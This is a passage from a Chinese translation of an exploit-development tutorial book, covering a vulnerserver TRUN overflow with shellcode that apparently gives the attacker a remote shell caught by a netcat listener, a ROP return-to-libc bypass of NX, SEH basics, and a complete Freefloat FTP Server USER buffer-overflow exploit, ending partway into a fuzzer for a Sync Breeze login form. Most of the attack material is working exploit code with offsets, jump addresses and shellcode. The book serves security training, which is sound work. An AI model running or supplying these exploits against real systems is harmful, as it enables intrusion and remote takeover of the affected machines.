shellcode += "\xfd\xc5\xd3\xd8\x10\x11\x6e\x83\x7c\xd6\x43\x3b\x7d"
shellcode += "\x70\xd3\x48\x4f\xdf\x4f\xc6\xe3\xa8\x49\x11\x03\x83"
shellcode += "\x2e\x8d\xfa\x2c\x4f\x84\x38\x78\x1f\xbe\xe9\x01\xf4"
shellcode += "\x3e\x15\xd4\x5b\x6e\xb9\x87\x1b\xde\x79\x78\xf4\x34"
shellcode += "\x76\xa7\xe4\x37\x5c\xc0\x8f\xc2\x37\x43\x5f\x95\xc6"
shellcode += "\xf3\x62\x25\xd9\xe2\xea\xc3\xb3\xf4\xba\x5c\x2c\x6c"
shellcode += "\xe7\x16\xcd\x71\x3d\x53\xcd\xfa\xb2\xa4\x80\x0a\xbe"
shellcode += "\xb6\x75\xfb\xf5\xe4\xd0\x04\x20\x80\xbf\x97\xaf\x50"
shellcode += "\xc9\x8b\x67\x07\x9e\x7a\x7e\xcd\x32\x24\x28\xf3\xce"
shellcode += "\xb0\x13\xb7\x14\x01\x9d\x36\xd8\x3d\xb9\x28\x24\xbd"
shellcode += "\x85\x1c\xf8\xe8\x53\xca\xbe\x42\x12\xa4\x68\x38\xfc"
shellcode += "\x20\xec\x72\x3f\x36\xf1\x5e\xc9\xd6\x40\x37\x8c\xe9"
shellcode += "\x6d\xdf\x18\x92\x93\x7f\xe6\x49\x10\x8f\xad\xd3\x31"
shellcode += "\x18\x68\x86\x03\x45\x8b\x7d\x47\x70\x08\x77\x38\x87"
shellcode += "\x10\xf2\x3d\xc3\x96\xef\x4f\x5c\x73\x0f\xe3\x5d\x56"

injection = junk + eip + nops + shellcode
s.send(('TRUN .' + injection + '\r\n'))
print s.recv(1024)
s.send('EXIT\r\n') 
print s.recv(1024)
s.close()
```

1.  现在，让我们再次启动 vulnserver。然后，在我们的攻击机器上设置一个监听器：

```
$ nc -lp 4321
```

1.  是时候尝试我们的 exploit 了，让我们保持对监听器的关注：

```
./exploit.py
```

1.  然后，从我们的监听 shell 中，执行以下命令：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00316.jpeg)

1.  让我们使用`ipconfig`来确认一下：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00317.jpeg)

1.  现在我们控制了我们的受害机器！

# 返回导向编程

什么是**返回导向编程**（**ROP**）？

让我们用最简单的方式解释 ROP 是什么。ROP 是一种技术，即使启用了 NX，也可以利用缓冲区溢出漏洞。ROP 技术可以使用 ROP 小工具绕过 NX 保护技术。

ROP 小工具是存储在内存中的机器指令地址序列。因此，如果我们能够改变执行流到这些指令中的一个，那么我们就可以控制应用程序，并且可以在不上传 shellcode 的情况下做到这一点。此外，ROP 小工具以`ret`指令结尾。如果你还没有明白，没关系；我们将进行一个例子来完全理解 ROP 是什么。

所以，我们需要安装 ropper，这是一个在二进制文件中查找 ROP 小工具的工具。你可以通过它在 GitHub 上的官方存储库下载它（[`github.com/sashs/Ropper`](https://github.com/sashs/Ropper)），或者你可以按照这里给出的说明：

```
 $ sudo apt-get install python-pip
 $ sudo pip install capstone
 $ git clone https://github.com/sashs/ropper.git
 $ cd ropper
 $ git submodule init
 $ git submodule update
```

让我们看看下一个有漏洞的代码，它将打印出`Starting /bin/ls`。执行`overflow`函数，它将从用户那里获取输入，然后打印出来以及输入的大小：

```
#include <stdio.h>
#include <unistd.h>

int overflow() 
{
    char buf[80];
    int r;
    read(0, buf, 500);
    printf("The buffer content %d, %s", r, buf);
    return 0;
}

int main(int argc, char *argv[]) 
{
    printf("Starting /bin/ls");
    overflow();
    return 0;
}
```

让我们编译它，但不要禁用 NX：

```
$ gcc -fno-stack-protector rop.c -o rop
```

然后，启动`gdb`：

```
$ gdb ./rop
```

现在，让我们确认 NX 是否已启用：

```
$ peda checksec
```

前面命令的输出可以在以下截图中看到：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00318.jpeg)

现在，让我们使用 PEDA 执行模糊测试并控制 RIP，而不是使用 Metasploit 框架：

```
$ peda pattern_create 500 pattern
```

这将创建一个包含`500`个字符的模式，并将文件保存为`pattern`。现在，让我们将这个模式作为输入读取：

```
$ run < pattern
```

前面命令的输出可以在以下截图中看到：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00319.jpeg)

程序崩溃了。下一步是检查栈中的最后一个元素，以计算 EIP 的偏移量：

```
$ x/wx $rsp
```

我们得到了栈中的最后一个元素为`0x41413741`（如果你使用相同的操作系统，这个地址应该是一样的）。现在，让我们看看这个模式的偏移量和下一个偏移量是否是 RIP 的确切偏移量：

```
$ peda pattern_offset 0x41413741
```

前面命令的输出可以在以下截图中看到：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00320.jpeg)

RIP 的确切偏移将从`105`开始。让我们也确认一下：

```
#!/usr/bin/env python
from struct import *

buffer = ""
buffer += "A"*104 # junk
buffer += "B"*6
f = open("input.txt", "w")
f.write(buffer)
```

这段代码应该用六个`B`字符溢出 RIP 寄存器：

```
$ chmod +x exploit.py
$ ./exploit.py
```

然后，从 GDB 内部运行以下命令：

```
$ run < input.txt
```

前面命令的输出可以在以下截图中看到：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00321.jpeg)

前面的截图表明我们正在朝着正确的方向前进。

由于 NX 已启用，我们无法上传和运行 shellcode，所以让我们使用返回到 libc 的 ROP 技术，这使我们能够使用来自 libc 本身的调用，这可能使我们能够调用函数。在这里，我们将使用`system`函数来执行 shell 命令。让我们看一下`system`的 man 页面：

```
$ man 3 system
```

前面命令的输出可以在以下截图中看到：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00322.jpeg)

我们需要的是`system`函数的地址，以及 shell 命令字符串的位置——幸运的是，我们在`/bin/ls`代码中有这个。

我们所做的唯一的事情就是将字符串的位置复制到栈中。现在，我们需要找到一种方法将位置复制到 RDI 寄存器，以启用系统函数执行`ls`命令。因此，我们需要 ROP 小工具，它可以提取字符串的地址并将其复制到 RDI 寄存器，因为第一个参数应该在 RDI 寄存器中。

好的，让我们从 ROP 小工具开始。让我们搜索与 RDI 寄存器相关的任何 ROP 小工具。然后，导航到你安装 ropper 的位置：

```
$ ./Ropper.py --file /home/stack/buffer-overflow/rop/rop --search "%rdi"
```

前面命令的输出可以在以下截图中看到：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00323.jpeg)

这个 ROP 小工具很完美：`pop rdi; ret;`，地址为`0x0000000000400653`。现在，我们需要从 GDB 内部找出`system`函数在内存中的确切位置：

```
$ p system
```

前面命令的输出可以在以下截图中看到：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00324.jpeg)

现在，我们还得到了`system`函数的地址，为`0x7ffff7a57590`。

在你的操作系统上，这个地址可能会有所不同。

让我们使用 GDB 获取`/bin/ls`字符串的位置：

```
$ find "/bin/ls"
```

前面命令的输出可以在以下截图中看到：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00325.jpeg)

现在，我们已经得到了带有地址`0x400697`的字符串的位置。

栈的逻辑顺序应该是：

1.  `system`函数的地址

1.  将被弹出到 RDI 寄存器的字符串指针

1.  ROP 小工具用于提取 pop，即栈中的最后一个元素到 RDI 寄存器

现在，我们需要以相反的顺序将它们推入栈中，使用我们的利用代码：

```
#!/usr/bin/env python
from struct import *

buffer = ""
buffer += "A"*104 # junk
buffer += pack("<Q", 0x0000000000400653) # <-- ROP gadget
buffer += pack("<Q", 0x400697) #  <-- pointer to "/bin/ls"
buffer += pack("<Q", 0x7ffff7a57590) # < -- address of system function

f = open("input.txt", "w")
f.write(buffer)
```

让我们运行脚本来更新`input.txt`：

```
$ ./exploit.py
```

然后，从 GDB 中运行以下命令：

```
$ run < input.txt
```

栈的逻辑顺序应该是：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00326.jpeg)

成功了！正如你所看到的，`ls`命令成功执行了。我们找到了绕过 NX 保护并利用这段代码的方法。

# 结构化异常处理

**结构化异常处理**（**SEH**）只是在代码执行过程中发生的事件。我们可以在高级编程语言中看到 SEH，比如 C++和 Python。看一下下面的代码：

```
try:
    divide(6,0)
except ValueError:
    print "That value was invalid."
```

这是一个除零的例子，会引发异常。程序应该改变执行流到其他地方，做里面的任何事情。

SEH 由两部分组成：

+   异常注册记录（SEH）

+   下一个异常注册记录（nSEH）

它们以相反的顺序推入堆栈。那么现在如何利用 SEH 呢？就像普通的堆栈溢出一样简单：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00327.gif)

这就是我们的利用程序应该看起来的样子。我们需要的是将一条指令**pop pop ret**推入**SEH**，以使跳转到**nSEH**。然后，将一条跳转指令推入**nSEH**，以使跳转到 shellcode；因此，我们的最终 shellcode 应该是这样的：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00328.gif)

我们将在第十一章，*真实场景-第 3 部分*中涵盖一个实际场景，关于利用 SEH。

# 摘要

在这里，我们简要讨论了利用程序的开发，从 fuzzing 开始，以及如何控制指令指针。然后，我们看到了如何为 shellcode 找到一个家园，并改变执行流到该 shellcode。最后，我们讨论了一种称为 ROP 的技术，用于绕过 NX 保护技术，并快速了解了 SEH 利用技术。

在下一章中，我们将通过*真实场景*来构建一个真实应用的利用程序。


# 第九章：现实世界的场景-第 1 部分

现在，我们将通过在真实目标上练习 fuzzing、控制指令指针和注入 shellcode 来总结本书。我将浏览[exploit-db.com](https://exploit-db.com/)，并从中选择真实目标。

# Freefloat FTP Server

让我们从这里下载 Freefloat FTP Server v1.0，开始吧：

[`www.exploit-db.com/apps/687ef6f72dcbbf5b2506e80a375377fa-freefloatftpserver.zip`](https://www.exploit-db.com/apps/687ef6f72dcbbf5b2506e80a375377fa-freefloatftpserver.zip)。此外，您还可以在[`www.exploit-db.com/exploits/40711/`](https://www.exploit-db.com/exploits/40711/)上看到 Windows XP 上的利用程序。

Freefloat FTP Server 有许多易受攻击的参数，可以用来练习，我们将在这里选择其中一个进行全面练习：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00329.jpeg)

现在，让我们在我们的 Windows 机器上从[`www.exploit-db.com/apps/687ef6f72dcbbf5b2506e80a375377fa-freefloatftpserver.zip`](https://www.exploit-db.com/apps/687ef6f72dcbbf5b2506e80a375377fa-freefloatftpserver.zip)下载它并解压缩。现在，打开它的目录，然后打开 Win32，并启动 FTP 服务器。它将显示在右上角的任务栏中。打开它以查看配置：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00330.jpeg)

易受攻击的服务器正在端口`21`上运行。让我们从攻击机上使用`nc`确认一下。

首先，我们受害机的 IP 地址是`192.168.129.128`：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00331.jpeg)

然后从攻击机上执行以下命令：

```
$ nc 192.168.129.128 21 
```

前面命令的输出可以在以下截图中看到：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00332.jpeg)

让我们尝试匿名访问：

```
$ USER anonymous
$ PASS anonymous
```

前面命令的输出可以在以下截图中看到：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00333.jpeg)

我们成功了！如果我们专注于`USER`参数呢？

# Fuzzing

由于手动使用`nc`命令的方式不高效，让我们使用 Python 语言构建一个脚本来执行：

```
#!/usr/bin/python
import socket
import sys

junk = 

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect = s.connect(('192.168.129.128',21))
s.recv(1024)
s.send('USER '+junk+'\r\n')
```

现在，让我们尝试使用`USER`参数进行 fuzzing 阶段。让我们从`junk`值为`50`开始：

```
#!/usr/bin/python
import socket
import sys

junk = 'A'*50

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect = s.connect(('192.168.129.128',21))
s.recv(1024)
s.send('USER '+junk+'\r\n')
```

然后从我们的受害机上，让我们将 Freefloat FTP Server 附加到 Immunity Debugger 中，并运行程序一次：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00334.jpeg)

让我们注册一下内容：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00335.jpeg)

然后，确保程序处于运行状态：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00336.jpeg)

现在，让我们运行我们的利用程序，然后看看 Immunity Debugger：

```
$ ./exploit.py
```

前面命令的输出可以在以下截图中看到：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00337.jpeg)

什么都没发生！让我们把垃圾值增加到`200`：

```
#!/usr/bin/python
import socket
import sys

junk = 'A'*200

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect = s.connect(('192.168.129.128',21))
s.recv(1024)
s.send('USER '+junk+'\r\n')
```

让我们重新运行这个利用程序，并观察 Immunity Debugger：

```
$ ./exploit.py
```

前面命令的输出可以在以下截图中看到：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00338.jpeg)

再次什么都没发生；让我们增加到`500`：

```
#!/usr/bin/python
import socket
import sys

junk = 'A'*500

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect = s.connect(('192.168.129.128',21))
s.recv(1024)
s.send('USER '+junk+'\r\n')
```

然后，运行利用程序：

```
$ ./exploit.py
```

前面命令的输出可以在以下截图中看到：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00339.jpeg)

程序崩溃了！让我们也看看寄存器：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00340.jpeg)

指令指针被我们的垃圾填满了：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00341.jpeg)

栈也像预期的那样填满了垃圾值，这将带我们进入下一个阶段。

# 控制指令指针

在这个阶段，我们将通过计算 EIP 寄存器的确切偏移量来控制指令指针。

让我们像之前一样使用 Metasploit Framework 创建模式：

```
$ cd /usr/share/metasploit-framework/tools/exploit/
$ ./pattern_create.rb -l 500
```

前面命令的输出可以在以下截图中看到：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00342.gif)

这是我们的模式，所以利用程序应该是这样的：

```
#!/usr/bin/python
import socket
import sys

junk = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq'

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect = s.connect(('192.168.129.128',21))
s.recv(1024)
s.send('USER '+junk+'\r\n')
```

关闭 Immunity Debugger，重新运行 Freefloat FTP Server，并将其附加到 Immunity Debugger。然后，运行程序：

```
$ ./exploit.py
```

前面命令的输出可以在以下截图中看到：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00343.jpeg)

EIP 中的当前模式是`37684136`：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00344.jpeg)

我们已经在 EIP 中找到了模式；现在，让我们获取它的确切偏移量：

```
$ cd /usr/share/metasploit-framework/tools/exploit/
$ ./pattern_offset.rb -q 37684136 -l 500
```

前面命令的输出可以在以下截图中看到：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00345.jpeg)

它在偏移量`230`；让我们确认一下：

```
#!/usr/bin/python
import socket
import sys

junk = 'A'*230
eip = 'B'*4
injection = junk+eip

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect = s.connect(('192.168.129.128',21))
s.recv(1024)
s.send('USER '+injection+'\r\n')
```

关闭 Immunity Debugger，然后再次启动它并启动 Freefloat FTP 服务器，将其附加到 Immunity Debugger 中，然后运行程序。然后执行我们的利用：

```
$ ./exploit.py
```

上述命令的输出可以在以下截图中看到：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00346.jpeg)

另外，让我们看看寄存器：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00347.jpeg)

`EIP`现在包含`42424242`；所以我们现在控制了`EIP`。

让我们继续下一阶段，找到一个地方放置我们的 shellcode 并注入它。

# 注入 shellcode

让我们看看分析 Freefloat FTP 服务器内部模式的另一种方法：

```
#!/usr/bin/python
import socket
import sys

junk = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq'

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect = s.connect(('192.168.129.128',21))
s.recv(1024)
s.send('USER '+junk+'\r\n')
```

让我们重新运行 Freefloat FTP 服务器，将其附加到 Immunity Debugger 中，然后点击运行程序图标。然后运行利用：

```
$ ./exploit.py
```

程序将再次崩溃；然后，从命令栏输入`!mona findmsp`：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00348.jpeg)

根据 Rapid7 博客[`blog.rapid7.com/2011/10/11/monasploit/`](https://blog.rapid7.com/2011/10/11/monasploit/)，`findmsp`命令执行以下操作：

+   在进程内存中（正常或 unicode 扩展）寻找循环模式的前 8 个字节的任何地方。

+   查看所有寄存器，并列出指向模式的部分或被覆盖的寄存器。如果寄存器指向模式，则它将显示偏移量和该偏移量之后内存中模式的长度。

+   在堆栈上寻找指向模式部分的指针（显示偏移量和长度）。

+   在堆栈上寻找模式的痕迹（显示偏移量和长度）。

+   查询 SEH 链，并确定它是否被循环模式覆盖。

之后，按下*Enter*：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00349.jpeg)

这个分析告诉我们确切的偏移量是`230`。它还告诉我们，最好放置 shellcode 的地方是在堆栈内部，并且将使用 ESP 寄存器，因为没有一个模式从堆栈中脱离出来。所以，让我们继续之前的步骤。

我们的利用应该是这样的：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00350.gif)

现在，让我们找到`JMP ESP`的地址：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00351.jpeg)

然后，搜索`JMP ESP`：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00352.gif)

现在我们需要选择任何地址来执行跳转到 ESP。我会选择`75BE0690`。

对于 shellcode，让我们选择一些小的东西；例如，让我们尝试这个 shellcode 在[`www.exploit-db.com/exploits/40245/`](https://www.exploit-db.com/exploits/40245/)，它在受害者的机器上生成一个消息框：

```
"\x31\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x8b\x48\x10\x31\xdb\x8b\x59\x3c\x01\xcb\x8b\x5b\x78\x01\xcb\x8b\x73\x20\x01\xce\x31\xd2\x42\xad\x01\xc8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78\x08\x64\x64\x72\x65\x75\xe2\x8b\x73\x1c\x01\xce\x8b\x14\x96\x01\xca\x89\xd6\x89\xcf\x31\xdb\x53\x68\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68\x4c\x6f\x61\x64\x54\x51\xff\xd2\x83\xc4\x10\x31\xc9\x68\x6c\x6c\x42\x42\x88\x4c\x24\x02\x68\x33\x32\x2e\x64\x68\x75\x73\x65\x72\x54\xff\xd0\x83\xc4\x0c\x31\xc9\x68\x6f\x78\x41\x42\x88\x4c\x24\x03\x68\x61\x67\x65\x42\x68\x4d\x65\x73\x73\x54\x50\xff\xd6\x83\xc4\x0c\x31\xd2\x31\xc9\x52\x68\x73\x67\x21\x21\x68\x6c\x65\x20\x6d\x68\x53\x61\x6d\x70\x8d\x14\x24\x51\x68\x68\x65\x72\x65\x68\x68\x69\x20\x54\x8d\x0c\x24\x31\xdb\x43\x53\x52\x51\x31\xdb\x53\xff\xd0\x31\xc9\x68\x65\x73\x73\x41\x88\x4c\x24\x03\x68\x50\x72\x6f\x63\x68\x45\x78\x69\x74\x8d\x0c\x24\x51\x57\xff\xd6\x31\xc9\x51\xff\xd0"
```

因此，我们的最终 shellcode 应该是这样的：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00353.gif)

让我们创建我们的最终利用：

```
#!/usr/bin/python
import socket
import sys

shellcode = "\x31\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x8b\x48\x10\x31\xdb\x8b\x59\x3c\x01\xcb\x8b\x5b\x78\x01\xcb\x8b\x73\x20\x01\xce\x31\xd2\x42\xad\x01\xc8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78\x08\x64\x64\x72\x65\x75\xe2\x8b\x73\x1c\x01\xce\x8b\x14\x96\x01\xca\x89\xd6\x89\xcf\x31\xdb\x53\x68\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68\x4c\x6f\x61\x64\x54\x51\xff\xd2\x83\xc4\x10\x31\xc9\x68\x6c\x6c\x42\x42\x88\x4c\x24\x02\x68\x33\x32\x2e\x64\x68\x75\x73\x65\x72\x54\xff\xd0\x83\xc4\x0c\x31\xc9\x68\x6f\x78\x41\x42\x88\x4c\x24\x03\x68\x61\x67\x65\x42\x68\x4d\x65\x73\x73\x54\x50\xff\xd6\x83\xc4\x0c\x31\xd2\x31\xc9\x52\x68\x73\x67\x21\x21\x68\x6c\x65\x20\x6d\x68\x53\x61\x6d\x70\x8d\x14\x24\x51\x68\x68\x65\x72\x65\x68\x68\x69\x20\x54\x8d\x0c\x24\x31\xdb\x43\x53\x52\x51\x31\xdb\x53\xff\xd0\x31\xc9\x68\x65\x73\x73\x41\x88\x4c\x24\x03\x68\x50\x72\x6f\x63\x68\x45\x78\x69\x74\x8d\x0c\x24\x51\x57\xff\xd6\x31\xc9\x51\xff\xd0";

junk = 'A'*230
eip = '\x90\x06\xbe\x75'
nops = '\x90'*10
injection = junk+eip+nops+shellcode

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect = s.connect(('192.168.129.128',21))
s.recv(1024)
s.send('USER '+injection+'\r\n')
```

现在我们已经准备好了；让我们重新运行 Freefloat FTP 服务器，然后运行我们的利用：

```
$ ./exploit.py
```

上述命令的输出可以在以下截图中看到：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00354.jpeg)

我们的利用成功了！

# 一个例子

我希望你尝试这个例子，但使用一个不同的参数，例如`MKD`参数，我会给你一段代码来开始：

```
#!/usr/bin/python
import socket
import sys

junk = ' '

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect = s.connect(('192.168.129.128',21))
s.recv(1024)
s.send('USER anonymous\r\n')
s.recv(1024)
s.send('PASS anonymous\r\n')
s.recv(1024)
s.send('MKD' + junk +'\r\n')
s.recv(1024)
s.send('QUIT\r\n')
s.close()
```

就像这个场景一样，所以尝试更有创意一些。

# 总结

在这一章中，我们从模糊化开始了一个真实且完整的场景。然后我们看了如何控制 EIP，然后注入和执行 shellcode。

在下一章中，我们将使用一个不同的方法来进行真实世界的场景，即拦截和模糊化 HTTP 头部内的参数。


# 第十章：真实场景-第 2 部分

在本章中，我们将练习利用开发，但从不同的角度，即我们的易受攻击的参数将在 HTTP 标头中。我们将看看如何拦截并查看 HTTP 标头的实际内容。

本章涵盖的主题如下：

+   同步 Breeze 企业

+   模糊测试

+   控制指令指针

+   注入 shellcode

# 同步 Breeze 企业

我们今天的场景将是 Sync Breeze Enterprise V.10.0.28。您可以在[`www.exploit-db.com/exploits/42928/`](https://www.exploit-db.com/exploits/42928/)上看到攻击，也可以从中下载易受攻击的版本或[`www.exploit-db.com/apps/959f770895133edc4cf65a4a02d12da8-syncbreezeent_setup_v10.0.28.exe`](https://www.exploit-db.com/apps/959f770895133edc4cf65a4a02d12da8-syncbreezeent_setup_v10.0.28.exe)。

下载并安装它。然后打开它，转到工具|高级选项|服务器。确保启用端口 80 上的 Web 服务器已激活：

！[](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00355.jpeg)

保存更改。然后，从我们的攻击机器上，通过 Firefox，使用端口`80`连接到此服务，这给了我们这个页面：

！[](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00356.jpeg)

现在，让我们尝试对登录参数进行一些模糊测试：

！[](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00357.jpeg)

# 模糊测试

现在，让我们使用 Python 生成一些`A`字符：

！[](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00358.gif)

让我们复制此字符串并将其用作此登录表单的输入：

！[](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00359.gif)

然后，让我们从此窗口复制实际输入并获取实际输入的长度：

！[](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00360.gif)

输入的实际长度为`64`，我们注入了`100`。客户端端有一些东西阻止我们注入超过`64`个字符。只需右键单击“用户名”文本输入，然后导航到检查|元素即可确认：

！[](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00361.jpeg)

我们可以简单地更改`maxlength="64"`的值并继续进行模糊测试，但我们需要构建我们的攻击。让我们尝试使用任何代理应用程序，如 Burp Suite 或 OWASP ** Zed Attack Proxy **（** ZAP **）查看 HTTP 标头的内容。我将在这里使用 Burp Suite 并设置代理，以便我可以拦截此 HTTP 标头。

启动 Burp Suite，然后转到代理|选项，并确保 Burp Suite 正在侦听环回地址 127.0.0.1 上的端口`8080`：

！[](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00362.jpeg)

然后，通过您的浏览器，使用端口`8080`在环回地址`127.0.0.1`上设置代理：

！[](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00363.jpeg)

准备登录页面，并通过导航到代理|拦截来激活 Burp Suite 中的拦截：

！[](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00364.jpeg)

现在，拦截已准备就绪。让我们在登录表单中注入任意数量的字符，然后单击登录并返回到 Burp Suite：

！[](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00365.jpeg)

关闭 Burp Suite。将代理设置回正常状态，然后使用此标头构建我们的模糊代码并对`用户名`参数进行模糊测试：

```
#!/usr/bin/python
import socket

junk = 

payload="username="+junk+"&password=A"

buffer="POST /login HTTP/1.1\r\n"
buffer+="Host: 192.168.129.128\r\n"
buffer+="User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
buffer+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
buffer+="Accept-Language: en-US,en;q=0.5\r\n"
buffer+="Referer: http://192.168.129.128/login\r\n"
buffer+="Connection: close\r\n"
buffer+="Content-Type: application/x-www-form-urlencoded\r\n"
buffer+="Content-Length: "+str(len(payload))+"\r\n"
buffer+="\r\n"
